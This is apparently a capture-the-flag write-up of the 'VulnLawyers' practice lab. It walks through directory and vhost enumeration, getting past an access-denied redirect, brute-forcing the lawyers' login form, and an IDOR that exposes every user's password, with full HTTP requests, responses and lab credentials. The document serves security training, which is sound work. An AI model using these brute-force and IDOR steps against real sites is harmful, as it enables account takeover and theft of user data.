# Vulnlawyers

## Dirsearch

- all scans on all vhosts are done with the default wordlist for dirsearch as well as the wordlists that are provided by hackinghub

```bash
┌──(kali㉿kali)-[~]
└─$ dirsearch -u https://agate.ctfio.com/ -e --exclude-status 400,403,500,404 -r -t 100
[18:01:19] 301 -  178B  - /css  ->  https://agate.ctfio.com/css/            
[18:01:22] 301 -  178B  - /images  ->  https://agate.ctfio.com/images/
[18:01:23] 301 -  178B  - /js  ->  https://agate.ctfio.com/js/              
[18:01:24] 302 -    1KB - /login/  ->  /denied                              

```

```bash
┌──(kali㉿kali)-[~]
└─$ dirsearch -u https://data.agate.ctfio.com/ -e --exclude-status 400,403,500,404 -r -t 100
[18:10:16] 200 -  396B  - /users/                                           
```

```bash
┌──(kali㉿kali)-[~]
└─$ dirsearch -u https://api.agate.ctfio.com/ -e --exclude-status 400,403,500,404 -r -t 100
[18:12:21] 200 -  396B  - /users/                                           
```

- both data and api endpoints appear to be the same
- all endpoints for the main page are 403 forbidden apart from the login form which displays an error that says “Access is denied from your IP address”
- we could modify the address in the http request to access login portal

```bash
users	
0	
name	"Yusef Mcclain"
email	"yusef.mcclain@vulnlawyers.ctf"
1	
name	"Shayne Cairns"
email	"shayne.cairns@vulnlawyers.ctf"
2	
name	"Eisa Evans"
email	"eisa.evans@vulnlawyers.ctf"
3	
name	"Jaskaran Lowe"
email	"jaskaran.lowe@vulnlawyers.ctf"
4	
name	"Marsha Blankenship"
email	"marsha.blankenship@vulnlawyers.ctf"
```

- text above is the users directory in the data vhost
- api endpoint also holds same information
- both endpoints appear to be the same no extra details in the source code

## Vhost scan

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ ./vhost-fuzzer.sh agate.ctfio.com /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt https://agate.ctfio.com/ 1

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://agate.ctfio.com/
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Header           : User-Agent: PENTEST
 :: Header           : Host: FUZZ.agate.ctfio.com
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 1
________________________________________________

data                    [Status: 200, Size: 109, Words: 3, Lines: 1, Duration: 28ms]
api                     [Status: 200, Size: 109, Words: 3, Lines: 1, Duration: 14ms]
Data                    [Status: 200, Size: 109, Words: 3, Lines: 1, Duration: 13ms]
API                     [Status: 200, Size: 109, Words: 3, Lines: 1, Duration: 9ms]
DATA                    [Status: 200, Size: 109, Words: 3, Lines: 1, Duration: 17ms]
:: Progress: [220560/220560] :: Job [1/1] :: 3921 req/sec :: Duration: [0:01:02] :: Errors: 0 ::
```

- two main vhosts found these will be scanned for directories as well

## Caido request inspection

- capturing the request to the login portal:

```bash
GET /denied HTTP/1.1
Host: agate.ctfio.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br, zstd
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Priority: u=0, i
```

```bash
HTTP/1.1 401 Unauthorized
Server: nginx/1.22.0 (Ubuntu)
Date: Mon, 19 May 2025 17:41:53 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
Content-Length: 957

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>VulnLawyers - Access Denied</title>
    <link href="/css/bootstrap.min.css" rel="stylesheet">
</head>

<body>
    <div class="container">
        <div class="row">
            <div class="col-md-12">
                <h1 style="padding-top:100px;text-align: center;color: #060505;letter-spacing: -1px;font-weight: bold">VulnLawyers</h1>
                <h3 class="text-center">We'll win that case!</h3>
            </div>
        </div>
        <div class="row">
            <div class="col-md-6 col-md-offset-3">
                <div class="alert alert-danger text-center">
                    <p>Access is denied from your IP address</p>
                </div>
            </div>
        </div>
    </div>
    <script src="/js/jquery.min.js"></script>
    <script src="/js/bootstrap.min.js"></script>
</body>

</html>
```

- after capturing this request i can see that it automatically changed the get request to /denied instead of the /login
- but what if i modified this request back to /login

```bash
GET /login HTTP/1.1
Host: agate.ctfio.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br, zstd
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Priority: u=0, i

```

```bash
HTTP/1.1 302 Found
Server: nginx/1.22.0 (Ubuntu)
Date: Mon, 19 May 2025 17:42:25 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
Location: /denied
Content-Length: 1056

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>VulnLawyers - Old Login</title>
    <link href="/css/bootstrap.min.css" rel="stylesheet">
</head>

<body>
    <div class="container">
        <div class="row">
            <div class="col-md-12">
                <h1 style="padding-top:100px;text-align: center;color: #060505;letter-spacing: -1px;font-weight: bold">VulnLawyers</h1>
                <h3 class="text-center">We'll win that case!</h3>
            </div>
        </div>
        <div class="row">
            <div class="col-md-6 col-md-offset-3">
                <div class="alert alert-info">
                    <p>Access to this portal can now be found here <a href=/lawyers-only">/lawyers-only</a></p>
                    <p>[^FLAG^^FLAG^]</p>
                </div>
            </div>
        </div>
    </div>
    <script src="/js/jquery.min.js"></script>
    <script src="/js/bootstrap.min.js"></script>
</body>

</html>
```

- this allowed me to access the “old login portal” and capture a flag
- we also found an endpoint which allowed us to access the login portal “/lawyers-only”

### Caido brute force login portal

- using the users we compromised earlier we can attach a payload to the password field in the request
- by trying all the emails against a word list i found credentials to the login portal
- using caidos automate function i could simply try one email after another and attach a wordlist to the password
- then keep running this attack swapping the emails each time until i find a response header that sticks out
- credentials found below

```bash
email=jaskaran.lowe@vulnlawyers.ctf&password=summer
```

```bash
POST /lawyers-only-login HTTP/1.1
Host: danburite.ctfio.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/x-www-form-urlencoded
Content-Length: 51
Origin: https://danburite.ctfio.com
Connection: close
Referer: https://danburite.ctfio.com/lawyers-only-login
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i

email=jaskaran.lowe@vulnlawyers.ctf&password=summer
```

```bash
HTTP/1.1 302 Found
Server: nginx/1.22.0 (Ubuntu)
Date: Mon, 19 May 2025 18:36:51 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Set-Cookie: token=7BCC07AAE3CCD9CD66223DF6D6932582; expires=Mon, 19-May-2025 19:36:51 GMT; Max-Age=3600; path=/
Location: /lawyers-only
Content-Length: 0
```

- above shows the request and response of the successful login attempt
- all emails tested only one user compromised

### IDOR vulnerability leads to user compromise

- since gaining access to the portal i was reviewing the source code and found a potential IDOR vulnerability in the profile page
- near the bottom in the source code there is a directory with a number on the end “/lawyers-only-profile-details/4”

```bash
<script>
    $.getJSON('/lawyers-only-profile-details/4',function(resp){
        $('input[name="email"]').val( resp.email );
        $('input[name="name"]').val( resp.name );
    });
</script>
```

- this number can be modified to display all other user information
- since we have already compromised this user:

```bash
email=jaskaran.lowe@vulnlawyers.ctf&password=summer
```

- the above user was already compromised his id value was 4
- but changing this value starting at 1 we can find other user data:

```bash
id	1
name	"Yusef Mcclain"
email	"yusef.mcclain@vulnlawyers.ctf"
password	"Rk@c7#U3@2r%0f"

id	2
name	"Shayne Cairns"
email	"shayne.cairns@vulnlawyers.ctf"
password	"q2V944&#2a1^3p"
flag	"[^FLAG^^FLAG^]"

id	3
name	"Eisa Evans"
email	"eisa.evans@vulnlawyers.ctf"
password	"Sn06#ibx@lGPG7"

4 has already been compromised

id	5
name	"Marsha Blankenship"
email	"marsha.blankenship@vulnlawyers.ctf"
password	"A^66vqhOU!e2ZV"
```

- 6 was not found so im guessing these are all the users compromised
- the page has a post on there from shayne, after logging in as him i can delete the case and find the last flag
- This was full user compromise, all these vulnerabilities addressed in this write up would be critical in a real life pen test since it led to full user compromise of all the user on the page. If this was a real world pen test on a larger platform this attack path would've led to even more users compromised